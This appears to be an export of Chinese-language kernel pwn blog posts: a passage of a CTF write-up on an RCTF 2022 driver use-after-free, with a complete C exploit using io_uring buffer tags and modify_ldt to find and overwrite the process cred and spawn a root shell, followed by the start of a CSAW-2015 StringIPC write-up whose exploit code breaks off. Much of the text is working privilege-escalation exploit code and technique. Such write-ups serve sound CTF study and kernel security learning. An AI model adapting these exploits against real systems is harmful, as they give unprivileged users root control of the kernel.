v12 )          &#123;            if ( v12 == 1 )              cur[1] = &quot;lucky&quot;;          &#125;          else          &#123;            kfree(*cur);            *cur = v2;            v2 = 0LL;          &#125;        &#125;LABEL_18:        kfree(v2);      &#125;    &#125;  &#125;  cur = a1-&gt;cur;  if ( !cur )    goto LABEL_24;  goto LABEL_10;&#125;\n\n然后就是change函数，这道题唯一难逆向的地方就在这里，仔细看其实也挺简单的，就是进行字符串对比然后进入相应的分值，其中kmemdup_nul函数会分配一个堆块，所以这里就是首先kfree掉当前context-&gt;cur[0]然后将新分配的堆块放进去。\nvoid __fastcall delMaind_0(Maind *context)&#123;  _QWORD *cur; // r14  _QWORD *prv; // r13  _fentry__();  printk(&quot;die\\n&quot;);  cur = context-&gt;cur;  prv = context-&gt;prv;  if ( cur )  &#123;    kfree(*cur);    *cur = 0LL;    kfree(cur);    context-&gt;cur = 0LL;  &#125;  if ( prv )  &#123;    kfree(*prv);    *prv = 0LL;    kfree(prv);    context-&gt;prv = 0LL;  &#125;  kfree(context);&#125;\n\n这个函数其实也就是hhoge_unlocked_ioctl_cold，可以看到这里会kfree掉的东西很多。\nssize_t __fastcall hhoge_read(file *file, char *ubuf, size_t size, loff_t *ppos)&#123;  unsigned __int64 v4; // rdx  Maind *private_data; // rax  void *v6; // r14  __int64 v7; // r12  _fentry__();  private_data = (Maind *)file-&gt;private_data;  if ( !private_data )    return 0LL;  v6 = private_data-&gt;cur;  if ( v6 )  &#123;    v7 = 9LL;    if ( v4 &lt;= 9 )      v7 = v4;    _check_object_size(private_data-&gt;cur, v7, 1LL);    copy_to_user(ubuf, v6, v7);  &#125;  return 0LL;&#125;\n\n最后就是read函数，最多只允许读取9个字节的内容。可以很容易的看出来，这里可以直接读取到堆地址。\n题目的漏洞很明显，如果我们使用change_cold函数分配一个堆块，那么此时这个堆块的地址在context-&gt;cur[0]中随后调用reborn_0函数，那么堆块地址在context-&gt;prv[0]中也存在了，那么如果我们再次调用change_cold函数的话，就会kfree调用context-&gt;cur[0]中的堆块，但是此时context-&gt;prv[0]指针仍然保存着目标堆块的地址，此时就形成了UAF。\n利用分析知道了io_uring以及上面的漏洞的话利用方式就很明显了，这里可以首先利用io_uring可以随意更新内容的机制以及read可以泄漏出堆地址配合modify_ldt实现任意地址读，在堆区中寻在task_struct结构体，进而获得cred地址。这里需要注意的是在新版本task_struct在这一片区域有一点小变化：\n\t/* Objective and real subjective task credentials (COW): */\tconst struct cred __rcu\t\t*real_cred;\t/* Effective (overridable) subjective task credentials (COW): */\tconst struct cred __rcu\t\t*cred;#ifdef CONFIG_KEYS\t/* Cached requested key. */\tstruct key\t\t\t*cached_requested_key;#endif\t/*\t * executable name, excluding path.\t *\t * - normally initialized setup_new_exec()\t * - access it with [gs]et_task_comm()\t * - lock it with task_lock()\t */\tchar\t\t\t\tcomm[TASK_COMM_LEN];\n\ncomm和cred中间新增了一个指针。\n随后释放掉ldt结构体，让ctx-&gt;buf_data-&gt;tag也就是上面的table分配的大小为0x10，使table占据这个UAF的堆块。那我们可以通过ring0的ctx-&gt;buf_data-&gt;tag[0]也就是table[0]去修改ring1的ctx-&gt;buf_data-&gt;tags为cred地址，如果我们此时修改ring1的ctx-&gt;buf_data-&gt;tag[0]就可以修改到cred结构体了，完成了提权。\n不熟悉上述提到的提权方式可以看一下这篇文章 kernel pwn内存任意读写提升权限[1]\n不熟悉modify_ldt的可以看一下这篇文章 modify_ldt利用\n综上可得exp#define _GNU_SOURCE#include &lt;err.h&gt;#include &lt;inttypes.h&gt;#include &lt;sched.h&gt;#include &lt;net/if.h&gt;#include &lt;netinet/in.h&gt;#include &lt;sys/ipc.h&gt;#include &lt;sys/msg.h&gt;#include &lt;sys/socket.h&gt;#include &lt;stdint.h&gt;#include &lt;sys/prctl.h&gt;#include &lt;sys/types.h&gt;#include &lt;stdio.h&gt;#include &lt;linux/userfaultfd.h&gt;#include &lt;pthread.h&gt;#include &lt;errno.h&gt;#include &lt;unistd.h&gt;#include &lt;stdlib.h&gt;#include &lt;fcntl.h&gt;#include &lt;signal.h&gt;#include &lt;string.h&gt;#include &lt;sys/mman.h&gt;#include &lt;sys/syscall.h&gt;#include &lt;sys/ioctl.h&gt;#include &lt;sys/sem.h&gt;#include &lt;semaphore.h&gt;#include &lt;poll.h&gt;#include &lt;time.h&gt;#include &lt;liburing.h&gt;struct io_uring ring, ring1, ring2;struct ldt_struct&#123;    size_t entries;    unsigned int nr_entries;    int slot;&#125;;void init_uring()&#123;    io_uring_queue_init(2, &amp;ring, 0);    io_uring_queue_init(2, &amp;ring1, 0);&#125;void register_tag(struct io_uring *ring, size_t *data, int num)&#123;    char tmp_buf[0x2000];    struct iovec vecs[num];    size_t tags[num];    memcpy(tags, data, num * sizeof(size_t));    for (int i = 0; i &lt; num; i++)    &#123;        vecs[i].iov_base = tmp_buf;        vecs[i].iov_len = 1;    &#125;    int res = io_uring_register_buffers_tags(ring, vecs, tags, num);    if (res &lt; 0)    &#123;        errExit(sprintf(&quot;io_uring_register_buffers_tags %d\\n&quot;, res));    &#125;&#125;void update_tag(struct io_uring *ring, size_t Data, int num)&#123;    char tmp_buf[1024];    struct iovec vecs[2];    vecs[0].iov_base = tmp_buf;    vecs[0].iov_len = 1;    vecs[1].iov_base = tmp_buf;    vecs[1].iov_len = 1;    int ret = io_uring_register_buffers_update_tag(ring, 0, vecs, Data, num);    if (ret &lt; 0)    &#123;        errExit(sprintf(&quot;io_uring_register_buffers_update_tag %d\\n&quot;, ret));    &#125;&#125;void errExit(char *err_msg)&#123;    puts(err_msg);    exit(-1);&#125;void get_shell()&#123;    if (getuid())    &#123;        printf(&quot;\\033[31m\\033[1m[x] Failed to get the root!\\033[0m\\n&quot;);        exit(-1);    &#125;    printf(&quot;\\033[32m\\033[1m[+] Successful to get the root. Execve root shell now...\\033[0m\\n&quot;);    system(&quot;/bin/sh&quot;);&#125;void print_hex(char *buf, int size)&#123;    int i;    puts(&quot;======================================&quot;);    printf(&quot;data :\\n&quot;);    for (i = 0; i &lt; (size / 8); i++)    &#123;        if (i % 2 == 0)        &#123;            if (i / 2 &lt; 10)            &#123;                printf(&quot;%d  &quot;, i / 2);            &#125;            else if (i / 2 &lt; 100)            &#123;                printf(&quot;%d &quot;, i / 2);            &#125;            else            &#123;                printf(&quot;%d&quot;, i / 2);            &#125;        &#125;        printf(&quot; %16llx&quot;, *(size_t *)(buf + i * 8));        if (i % 2 == 1)        &#123;            printf(&quot;\\n&quot;);        &#125;    &#125;    puts(&quot;======================================&quot;);&#125;struct user_desc&#123;    unsigned int entry_number;    unsigned int base_addr;    unsigned int limit;    unsigned int seg_32bit : 1;    unsigned int contents : 2;    unsigned int read_exec_only : 1;    unsigned int limit_in_pages : 1;    unsigned int seg_not_present : 1;    unsigned int useable : 1;    unsigned int lm : 1;&#125;;unsigned long kernel_addr;unsigned long kernel_base;unsigned long kernel_offset;int fd;int main()&#123;    signal(SIGSEGV, get_shell);    signal(SIGINT, get_shell);    char *buf = malloc(0x4000);    int pipe_fd[2] = &#123;0&#125;;    unsigned long *info = malloc(0x2000);    uint64_t search_addr;    uint64_t vmlinux_base = 0xffffffff81000000;    char target[16];    char *result;    uint64_t cred = -1;    size_t real_cred = -1;    int root_cred[12];    size_t target_addr;    memset(info, 0, sizeof(info));    strcpy(target, &quot;trytofind196082&quot;);    if (prctl(PR_SET_NAME, target, 0, 0, 0) != 0)    &#123;        errExit(&quot;cannot set name&quot;);    &#125;    fd = open(&quot;/dev/game&quot;, 0);    if (fd &lt; 0)    &#123;        errExit(&quot;failed open /dev/game&quot;);    &#125;    puts(&quot;\\033[34m\\033[1m[*] construct double free! \\033[0m&quot;);    init_uring();    memset(buf, 0, sizeof(buf));    ioctl(fd, 0, buf);    ioctl(fd, 0x72, &quot;flag=aaaaaaaaa&quot;); // context-&gt;cur[0] = object(0x10);    read(fd, buf, 8);    uint64_t heap_addr = *(uint64_t *)buf;    printf(&quot;\\033[32m\\033[1m[+] heap_addr : \\033[0m %p\\n&quot;, heap_addr);    ioctl(fd, 1, buf);                 // context-&gt;prv[0] = object(0x10);    ioctl(fd, 0x72, &quot;flag=bbbbbbbbb&quot;); // kfree(context-&gt;cur[0]);    struct user_desc desc;    desc.base_addr = 0xff0000;    desc.entry_number = 0x1000 / 8;    desc.limit = 0;    desc.seg_32bit = 0;    desc.contents = 0;    desc.read_exec_only = 0;    desc.limit_in_pages = 0;    desc.seg_not_present = 0;    desc.useable = 0;    desc.lm = 0;    syscall(SYS_modify_ldt, 1, &amp;desc, sizeof(desc)); // context-&gt;prev[0] = object(0x10) == ldt_struct;    ioctl(fd, 0x16, buf); // double free     kfree(object(ldt_struct));    puts(&quot;\\n\\033[34m\\033[1m[*] search cred!\\033[0m&quot;);    register_tag(&amp;ring, buf, 2);    search_addr = heap_addr &amp; 0xfffffffffffff000;    pipe(pipe_fd);    struct ldt_struct ldt;    unsigned long long int i = 0;    while (1)    &#123;        memset(buf, 0, 0x1000);        ldt.entries = search_addr - i * 0x1000;        ldt.nr_entries = 0x1000 / 8;        update_tag(&amp;ring, &amp;ldt, 2);        if (i &amp;&amp; i % 0x200 == 0)        &#123;            printf(&quot;\\033[34m\\033[1m[*] looked up range from \\033[0m %p ~ %p\\n&quot;, search_addr - i * 0x1000, search_addr + i * 0x1000);        &#125;        if (!fork())        &#123;            int res = syscall(SYS_modify_ldt, 0, buf, 0x1000);            if (res != 0x1000)            &#123;                errExit(&quot;read_ldt failed!&quot;);            &#125;            result = memmem(buf, 0x1000, target, 0x10);            if (result)            &#123;                cred = *(size_t *)(result - 0x10);                real_cred = *(size_t *)(result - 0x18);                if ((real_cred &amp; 0xff00000000000000) &amp;&amp; (real_cred == cred))                &#123;                    target_addr = search_addr - (i * 0x1000) + (result - buf);                    printf(&quot;\\033[32m\\033[1m[+] found task_struct : \\033[0m %p\\n&quot;, target_addr);                    printf(&quot;\\033[32m\\033[1m[+] found cred : \\033[0m %p\\n&quot;, real_cred);                &#125;                else                &#123;                    real_cred = -1;                    printf(&quot;\\033[31m\\033[1m[-]\\033[0m cannot rehint cred\\n&quot;);                &#125;            &#125;            write(pipe_fd[1], &amp;real_cred, 8);            exit(0);        &#125;        wait(NULL);        read(pipe_fd[0], &amp;real_cred, 8);        if (real_cred != -1)        &#123;            break;        &#125;        if (i == 0)        &#123;            i++;            continue;        &#125;        memset(buf, 0, 0x1000);        ldt.entries = search_addr + i * 0x1000;        ldt.nr_entries = 0x1000 / 8;        update_tag(&amp;ring, &amp;ldt, 2);        if (!fork())        &#123;            int res = syscall(SYS_modify_ldt, 0, buf, 0x1000);            if (res != 0x1000)            &#123;                errExit(&quot;read_ldt failed!&quot;);            &#125;            result = memmem(buf, 0x1000, target, 0x10);            if (result)            &#123;                cred = *(size_t *)(result - 0x10);                real_cred = *(size_t *)(result - 0x18);                if ((real_cred &amp; 0xff00000000000000) &amp;&amp; (real_cred == cred))                &#123;                    target_addr = search_addr + (i * 0x1000) + (result - buf);                    printf(&quot;\\033[32m\\033[1m[+] found task_struct : \\033[0m %p\\n&quot;, target_addr);                    printf(&quot;\\033[32m\\033[1m[+] found cred : \\033[0m %p\\n&quot;, real_cred);                &#125;                else                &#123;                    real_cred = -1;                    printf(&quot;\\033[31m\\033[1m[-]\\033[0m cannot rehint cred\\n&quot;);                &#125;            &#125;            write(pipe_fd[1], &amp;real_cred, 8);            exit(0);        &#125;        wait(NULL);        read(pipe_fd[0], &amp;real_cred, 8);        if (real_cred != -1)        &#123;            break;        &#125;        i++;    &#125;    puts(&quot;\\n\\033[34m\\033[1m[*] write cred!\\033[0m&quot;);    desc.base_addr = 0xff1000;    desc.entry_number = 0x1000 / 4;    desc.limit = 0;    desc.seg_32bit = 0;    desc.contents = 0;    desc.read_exec_only = 0;    desc.limit_in_pages = 0;    desc.seg_not_present = 0;    desc.useable = 0;    desc.lm = 0;    syscall(SYS_modify_ldt, 1, &amp;desc, sizeof(desc));    memset(buf, 0, 0x1000);    register_tag(&amp;ring1, buf, (0x1000 / 8) + 1);    for (int i = 0; i &lt;= 5; i++)    &#123;        *(uint64_t *)buf = real_cred + 4 + 8 * i;        update_tag(&amp;ring, buf, 1);        *(uint64_t *)buf = 0;        read(fd, info, 9);        update_tag(&amp;ring1, buf, 1);    &#125;    *(uint64_t *)buf = search_addr + 0x3000000;    update_tag(&amp;ring, buf, 1);    puts(&quot;\\033[32m\\033[1m[+] write Done \\033[0m&quot;);    get_shell();    return 0;&#125;\n\n\n\n参考链接:\n​    https://blog.rois.io/2022/rctf-2022-official-write-up/\n​    https://elixir.bootlin.com/linux/v6.0.12/source\n​    https://github.com/axboe/liburing/tree/d6527ac94c1bb2a2551b45899b23e8d256c3f896\n题目链接:\n​    XCTF中可以下载\n","categories":["Linux Kernel"],"tags":["io_uring","modify_ldt"]},{"title":"kernel pwn内存任意读写提升权限[1]","url":"/2022/08/03/kernel-pwn%E5%86%85%E5%AD%98%E4%BB%BB%E6%84%8F%E8%AF%BB%E5%86%99%E6%8F%90%E5%8D%87%E6%9D%83%E9%99%90/","content":"前言分析通过内存任意读写到提升权限的三种方式\n在此之前呢，我所写的关于kernel的文章中适用到的提权方式基本都是通过commit_creds(prepare_kernel_cred(0));以及第一篇提到的直接修改cred结构体，所以这里将入门的其余几条提权方式记录一下\n本文使用题目：https://github.com/196082/196082\n例题分析CSAW-2015-StringIPC\nqemu-system-x86_64 \\-m 512M \\-kernel ./bzImage \\-initrd  ./core.cpio \\-append &quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet&quot; \\-cpu qemu64,+smep,+smap \\-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \\-nographic  -enable-kvm  \\-s\n\n首先了开启了smep和smap保护，没有开启kaslr\ncat /proc/kallsyms &gt; /tmp/kallsymsecho 1 &gt; /proc/sys/kernel/kptr_restrictecho 1 &gt; /proc/sys/kernel/dmesg_restrict\n\ninit脚本没什么好说的，这里将符号表放到了tmp内\n下面来看驱动的代码：\ncase 0x77617364u:    if ( copy_from_user(&amp;write_channel, v3, 0x10LL) )        return -22LL;    p_lock = &amp;private_data-&gt;lock;    count = -16LL;    mutex_lock(&amp;private_data-&gt;lock);    if ( !private_data-&gt;channel )    &#123;        count = alloc_new_ipc_channel(*&amp;write_channel.id, &amp;channel);// 根据write_channel.id的值申请相应大小的堆块        if ( count &gt;= 0 )        &#123;            private_data-&gt;channel = channel;            LODWORD(write_channel.buf) = channel-&gt;id;// 返回堆块相应的idx            if ( copy_to_user(v5, &amp;write_channel, 0x10LL) )            &#123;                count = -22LL;                close_ipc_channel(private_data, channel-&gt;id);            &#125;        &#125;    &#125;    goto LABEL_9;case 0x77617365u:    if ( copy_from_user(&amp;write_channel, v3, 4LL) )        return -22LL;    p_lock = &amp;private_data-&gt;lock;    count = -16LL;    mutex_lock(&amp;private_data-&gt;lock);    if ( private_data-&gt;channel )        goto LABEL_9;    channel_by_id = get_channel_by_id(write_channel.id, v5);// 可以看到是根据idx获取channel    count = channel_by_id;    if ( channel_by_id &gt; 0xFFFFFFFFFFFFF000LL )        goto LABEL_9;    private_data-&gt;channel = channel_by_id;    if ( !_InterlockedSub(&amp;channel_by_id-&gt;ref.refcount.counter, 1u) )        ipc_channel_destroy(&amp;channel_by_id-&gt;ref);// 释放channel    count = 0LL;    mutex_unlock(&amp;private_data-&gt;lock);    return count;\n\ncase 0x77617366u:    if ( copy_from_user(&amp;write_channel, v3, 16LL) )        return -22LL;    v11 = &amp;private_data-&gt;lock;    mutex_lock(v11);    v13 = 1LL;    goto LABEL_24;case 0x77617367u:    if ( copy_from_user(&amp;write_channel, v3, 16LL) )        return -22LL;    v11 = &amp;private_data-&gt;lock;    mutex_lock(v11);    v13 = 0LL;LABEL_24:    count = realloc_ipc_channel(write_channel.id, write_channel.buf, v13, v12);    mutex_unlock(v11);    return count;\n\n可以看到这里会进入到realloc_ipc_channel\nunsigned __int64 __fastcall realloc_ipc_channel(ipc_state *state, __int64 id, size_t size, int grow)&#123;    int v4; // edx    int v5; // r13d    unsigned __int64 result; // rax    unsigned __int64 v7; // rbx    __int64 v8; // r12    __int64 v9; // rax    _fentry__(state, id);    v5 = v4;    result = get_channel_by_id(state, id);// 根据idx获取channel    v7 = result;    if ( result &lt;= 0xFFFFFFFFFFFFF000LL )    &#123;        if ( v5 )// 变大还是变小            v8 = *(result + 16) + id;        else            v8 = *(result + 16) - id;        v9 = krealloc(*(result + 8), v8 + 1, 37748928LL);        if ( v9 )        &#123;            *(v7 + 8) = v9;            *(v7 + 16) = v8;            if ( _InterlockedSub(v7, 1u) )            &#123;                return 0LL;            &#125;            else            &#123;                ipc_channel_destroy(v7);                return 0LL;            &#125;        &#125;        else        &#123;            return 4294967274LL;        &#125;    &#125;    return result;&#125;\n\n当krealloc返回值不为0时，可以通过验证，将返回值作为内存块起始地址\nmm\\slab_common.c:/** * krealloc - reallocate memory. The contents will remain unchanged. * @p: object to reallocate memory for. * @new_size: how many bytes of memory are required. * @flags: the type of memory to allocate. * * The contents of the object pointed to are preserved up to the * lesser of the new and old sizes.  If @p is %NULL, krealloc() * behaves exactly like kmalloc().  If @new_size is 0 and @p is not a * %NULL pointer, the object pointed to is freed. */void *krealloc(const void *p, size_t new_size, gfp_t flags)&#123;\tvoid *ret;\tif (unlikely(!new_size)) &#123;\t\tkfree(p);\t\treturn ZERO_SIZE_PTR;\t&#125;\tret = __do_krealloc(p, new_size, flags);\tif (ret &amp;&amp; p != ret)\t\tkfree(p);\treturn ret;&#125;EXPORT_SYMBOL(krealloc);include\\linux\\slab.h:#define ZERO_SIZE_PTR ((void *)16)\n\n所以我们可以构造new_size为0即可返回0x10，并且我们构造为0是让记录size的位置为-1\ncase 0x77617368u:    if ( copy_from_user(&amp;write_channel, v3, 24LL) )        return -22LL;    p_lock = &amp;private_data-&gt;lock;    mutex_lock(&amp;private_data-&gt;lock);    v14 = private_data-&gt;channel;    count = write_channel.count;    if ( !private_data-&gt;channel )        goto LABEL_40;    index = v14-&gt;index;    if ( write_channel.count + index &gt; v14-&gt;buf_size        || copy_to_user(write_channel.buf, &amp;v14-&gt;data[index], LODWORD(write_channel.count)) )    &#123;        goto LABEL_31;    &#125;    goto LABEL_9;case 0x77617369u:    if ( copy_from_user(&amp;write_channel, v3, 24LL) )        return -22LL;    p_lock = &amp;private_data-&gt;lock;    mutex_lock(&amp;private_data-&gt;lock);    v16 = private_data-&gt;channel;    count = write_channel.count;    if ( !private_data-&gt;channel )    &#123;        LABEL_40:        count = -6LL;        goto LABEL_9;    &#125;    v17 = v16-&gt;index;    if ( write_channel.count + v17 &gt; v16-&gt;buf_size        || strncpy_from_user(&amp;v16-&gt;data[v17], write_channel.buf, write_channel.count) &lt; 0 )    &#123;        goto LABEL_31;    &#125;    goto LABEL_9;case 0x7761736Au:    if ( copy_from_user(&amp;write_channel, v3, 24LL) )        return -22LL;    p_lock = &amp;private_data-&gt;lock;    count = -6LL;    mutex_lock(&amp;private_data-&gt;lock);    v8 = private_data-&gt;channel;    if ( !private_data-&gt;channel )        goto LABEL_9;    if ( LODWORD(write_channel.count) )    &#123;        if ( LODWORD(write_channel.count) == 1 )        &#123;            count = v8-&gt;index;            goto LABEL_9;        &#125;        goto LABEL_31;    &#125;    count = (__int64)write_channel.buf;    if ( (char *)v8-&gt;buf_size &lt;= write_channel.buf )    &#123;        LABEL_31:        count = -22LL;        goto LABEL_9;    &#125;    v8-&gt;index = (loff_t)write_channel.buf;    LABEL_9:    mutex_unlock(p_lock);    return count;\n\n下面则是根据修改index，然后根据index读取或者写入内容。\n.text:0000000000000652 48 8B 5D C8                   mov     rbx, [rbp-38h].text:0000000000000656 48 39 58 10                   cmp     [rax+10h], rbx.text:000000000000065A 76 85                         jbe     short loc_5E1\n\n并且可以看到下面是无符号比较，所以我们刚刚写入的-1就会变成最大的值，也就造成了任意地址读写了。\n修改cred结构提升权限cred结构体应该不会很陌生，所以我们的思路就是修改cred结构体中记录进程权限的值即可\n首先，每一个线程在内核中都对应一个线程栈、一个线程结构块thread_info去调度，结构体里面同时也包含了线程的一系列信息\nstruct thread_info &#123;\tstruct task_struct\t*task;\t\t/* main task structure */\t__u32\t\t\tflags;\t\t/* low level flags */\t__u32\t\t\tstatus;\t\t/* thread synchronous flags */\t__u32\t\t\tcpu;\t\t/* current CPU */\tmm_segment_t\t\taddr_limit;\tunsigned int\t\tsig_on_uaccess_error:1;\tunsigned int\t\tuaccess_err:1;\t/* uaccess failed */&#125;;\n\nthread_info结构体存放在线程栈中最低的地址，并且包含一个重要信息task_struct\nstruct task_struct &#123;\tvolatile long state;\t/* -1 unrunnable, 0 runnable, &gt;0 stopped */\tvoid *stack;\tatomic_t usage;\tunsigned int flags;\t/* per process flags, defined below */\tunsigned int ptrace;\t... ...\t/* process credentials */\tconst struct cred __rcu *ptracer_cred; /* Tracer&#x27;s credentials at attach */\tconst struct cred __rcu *real_cred; /* objective and real subjective task\t\t\t\t\t * credentials (COW) */\tconst struct cred __rcu *cred;\t/* effective (overridable) subjective task\t\t\t\t\t * credentials (COW) */\tchar comm[TASK_COMM_LEN]; /* executable name excluding path\t\t\t\t     - access with [gs]et_task_comm (which lock\t\t\t\t       it with task_lock())\t\t\t\t     - initialized normally by setup_new_exec */\t/* file system info */\tstruct nameidata *nameidata;\t    #ifdef CONFIG_SYSVIPC    /* ipc stuff */        struct sysv_sem sysvsem;        struct sysv_shm sysvshm;    #endif    ... ... &#125;;\n\n可以看到其中存放着cred结构体，这里就不再提cred结构体了\nstruct cred *prepare_creds(void)&#123;\tstruct task_struct *task = current;\tconst struct cred *old;\tstruct cred *new;\tvalidate_process_creds();\tnew = kmem_cache_alloc(cred_jar, GFP_KERNEL);\tif (!new)\t\treturn NULL;\tkdebug(&quot;prepare_creds() alloc %p&quot;, new);\told = task-&gt;cred;\tmemcpy(new, old, sizeof(struct cred));\tatomic_set(&amp;new-&gt;usage, 1);\tset_cred_subscribers(new, 0);\tget_group_info(new-&gt;group_info);\tget_uid(new-&gt;user);\tget_user_ns(new-&gt;user_ns);#ifdef CONFIG_KEYS\tkey_get(new-&gt;session_keyring);\tkey_get(new-&gt;process_keyring);\tkey_get(new-&gt;thread_keyring);\tkey_get(new-&gt;request_key_auth);#endif#ifdef CONFIG_SECURITY\tnew-&gt;security = NULL;#endif\tif (security_prepare_creds(new, old, GFP_KERNEL) &lt; 0)\t\tgoto error;\tvalidate_creds(new);\treturn new;error:\tabort_creds(new);\treturn NULL;&#125;EXPORT_SYMBOL(prepare_creds);\n\n可以看到cred结构体是通过kmem_cache_alloc创建的\n利用方式利用内存任意读找到cred结构体，再利用内存任意写，将用于表示权限的数据位写为0，就可以完成提权\n如何找到这个结构体?在task_struct里有一个 char comm[TASK_COMM_LEN]; 字符数组，这个字符串表示线程的名字，其内容可以通过linux的prctl(PR_SET_NAME,target);来设置指定的值。那么，我们设置一个复杂的长度不超过16字节的字符串作为标记，然后，在内存里搜索这个标记，如果搜索到了，就可以确定这个位置前面就是cred指针\nlinux kernel内存映射图：\n0xffffffffffffffff  ---+-----------+-----------------------------------------------+-------------+                       |           |                                               |+++++++++++++|    8M                 |           | unused hole                                   |+++++++++++++|                       |           |                                               |+++++++++++++|0xffffffffff7ff000  ---|-----------+------------| FIXADDR_TOP |--------------------|+++++++++++++|    1M                 |           |                                               |+++++++++++++|0xffffffffff600000  ---+-----------+------------| VSYSCALL_ADDR |------------------|+++++++++++++|    548K               |           | vsyscalls                                     |+++++++++++++|0xffffffffff577000  ---+-----------+------------| FIXADDR_START |------------------|+++++++++++++|    5M                 |           | hole                                          |+++++++++++++|0xffffffffff000000  ---+-----------+------------| MODULES_END |--------------------|+++++++++++++|                       |           |                                               |+++++++++++++|    1520M              |           | module mapping space (MODULES_LEN)            |+++++++++++++|                       |           |                                               |+++++++++++++|0xffffffffa0000000  ---+-----------+------------| MODULES_VADDR |------------------|+++++++++++++|                       |           |                                               |+++++++++++++|    512M               |           | kernel text mapping, from phys 0              |+++++++++++++|                       |           |                                               |+++++++++++++|0xffffffff80000000  ---+-----------+------------| __START_KERNEL_map |-------------|+++++++++++++|    2G                 |           | hole                                          |+++++++++++++|0xffffffff00000000  ---+-----------+-----------------------------------------------|+++++++++++++|    64G                |           | EFI region mapping space                      |+++++++++++++|0xffffffef00000000  ---+-----------+-----------------------------------------------|+++++++++++++|    444G               |           | hole                                          |+++++++++++++|0xffffff8000000000  ---+-----------+-----------------------------------------------|+++++++++++++|    16T                |           | %esp fixup stacks                             |+++++++++++++|0xffffff0000000000  ---+-----------+-----------------------------------------------|+++++++++++++|    3T                 |           | hole                                          |+++++++++++++|0xfffffc0000000000  ---+-----------+-----------------------------------------------|+++++++++++++|    16T                |           | kasan shadow memory (16TB)                    |+++++++++++++|0xffffec0000000000  ---+-----------+-----------------------------------------------|+++++++++++++|    1T                 |           | hole                                          |+++++++++++++|0xffffeb0000000000  ---+-----------+-----------------------------------------------| kernel space|    1T                 |           | virtual memory map for all of struct pages    |+++++++++++++|0xffffea0000000000  ---+-----------+------------| VMEMMAP_START |------------------|+++++++++++++|    1T                 |           | hole                                          |+++++++++++++|0xffffe90000000000  ---+-----------+------------| VMALLOC_END   |------------------|+++++++++++++|    32T                |           | vmalloc/ioremap (1 &lt;&lt; VMALLOC_SIZE_TB)        |+++++++++++++|0xffffc90000000000  ---+-----------+------------| VMALLOC_START |------------------|+++++++++++++|    1T                 |           | hole                                          |+++++++++++++|0xffffc80000000000  ---+-----------+-----------------------------------------------|+++++++++++++|                       |           |                                               |+++++++++++++|                       |           |                                               |+++++++++++++|                       |           |                                               |+++++++++++++|                       |           |                                               |+++++++++++++|                       |           |                                               |+++++++++++++|                       |           |                                               |+++++++++++++|                       |           |                                               |+++++++++++++|                       |           |                                               |+++++++++++++|                       |           |                                               |+++++++++++++|                       |           |                                               |+++++++++++++|    64T                |           | direct mapping of all phys. memory            |+++++++++++++|                       |           | (1 &lt;&lt; MAX_PHYSMEM_BITS)                       |+++++++++++++|                       |           |                                               |+++++++++++++|                       |           |                                               |+++++++++++++|                       |           |                                               |+++++++++++++|                       |           |                                               |+++++++++++++|                       |           |                                               |+++++++++++++|                       |           |                                               |+++++++++++++|                       |           |                                               |+++++++++++++|                       |           |                                               |+++++++++++++|                       |           |                                               |+++++++++++++|0xffff880000000000 ----+-----------+-----------| __PAGE_OFFSET_BASE | -------------|+++++++++++++|                       |           |                                               |+++++++++++++|    8T                 |           | guard hole, reserved for hypervisor           |+++++++++++++|                       |           |                                               |+++++++++++++|0xffff800000000000 ----+-----------+-----------------------------------------------+-------------+                       |-----------|                                               |-------------|                       |-----------| hole caused by [48:63] sign extension         |-------------|                       |-----------|                                               |-------------|0x0000800000000000 ----+-----------+-----------------------------------------------+-------------+    PAGE_SIZE          |           | guard page                                    |xxxxxxxxxxxxx|0x00007ffffffff000 ----+-----------+--------------| TASK_SIZE_MAX | ---------------|xxxxxxxxxxxxx|                       |           |                                               |  user space |                       |           |                                               |xxxxxxxxxxxxx|                       |           |                                               |xxxxxxxxxxxxx|                       |           |                                               |xxxxxxxxxxxxx|    128T               |           | different per mm                              |xxxxxxxxxxxxx|                       |           |                                               |xxxxxxxxxxxxx|                       |           |                                               |xxxxxxxxxxxxx|                       |           |                                               |xxxxxxxxxxxxx|0x0000000000000000 ----+-----------+-----------------------------------------------+-------------+\n\n在0xffff880000000000——0xffffc80000000000区域，是堆的分配区域，因此，我们只需要搜索这段内存，即可找到task_struct结构，进而找到cred结构。\n综上，exp：\n#include &lt;stdio.h&gt;#include &lt;sys/prctl.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/stat.h&gt;#include &lt;fcntl.h&gt;#include &lt;string.h&gt;#define CSAW_IOCTL_BASE 0x77617363#define CSAW_ALLOC_CHANNEL CSAW_IOCTL_BASE + 1#define CSAW_OPEN_CHANNEL CSAW_IOCTL_BASE + 2#define CSAW_GROW_CHANNEL CSAW_IOCTL_BASE + 3#define CSAW_SHRINK_CHANNEL CSAW_IOCTL_BASE + 4#define CSAW_READ_CHANNEL CSAW_IOCTL_BASE + 5#define CSAW_WRITE_CHANNEL CSAW_IOCTL_BASE + 6#define CSAW_SEEK_CHANNEL CSAW_IOCTL_BASE + 7#define CSAW_CLOSE_CHANNEL CSAW_IOCTL_BASE + 8struct alloc_channel_args&#123;\tsize_t buf_size;\tint id;&#125;;struct open_channel_args&#123;\tint id;&#125;;struct shrink_channel_args&#123;\tint id;\tsize_t size;&#125;;struct read_channel_args&#123;\tint id;\tchar *buf;\tsize_t count;&#125;;struct write_channel_args&#123;\tint id;\tchar *buf;\tsize_t count;&#125;;struct seek_channel_args&#123;\tint id;\tloff_t index;\tint whence;&#125;;struct close_channel_args&#123;\tint id;&#125;;void print_hex(char *buf, size_t len)&#123;\tint i;\tfor (i = 0; i &lt; ((len / 8) * 8); i += 8)\t&#123;\t\tprintf(&quot;0x%lx&quot;, *(size_t *)(buf + i));\t\tif (i % 16)\t\t\tprintf(&quot; &quot;);\t\telse\t\t\tprintf(&quot;\\n&quot;);\t&#125;&#125;int main()&#123;\tint fd = -1;\tint result = 0;\tstruct alloc_channel_args alloc_args;\tstruct shrink_channel_args shrink_args;\tstruct seek_channel_args seek_args;\tstruct read_channel_args read_args;\tstruct close_channel_args close_args;\tstruct write_channel_args write_args;\tsize_t addr = 0xffff880000000000;\tsize_t real_cred = 0;\tsize_t cred = 0;\tsize_t target_addr;\tint root_cred[12];\t// set target in task_struct\tsetvbuf(stdout, 0LL, 2, 0LL);\tchar *buf = malloc(0x1000);\tchar target[16];\tstrcpy(target, &quot;trytofind196082&quot;);\tprctl(PR_SET_NAME, target);\tfd = open(&quot;/dev/csaw&quot;, O_RDWR);\tif 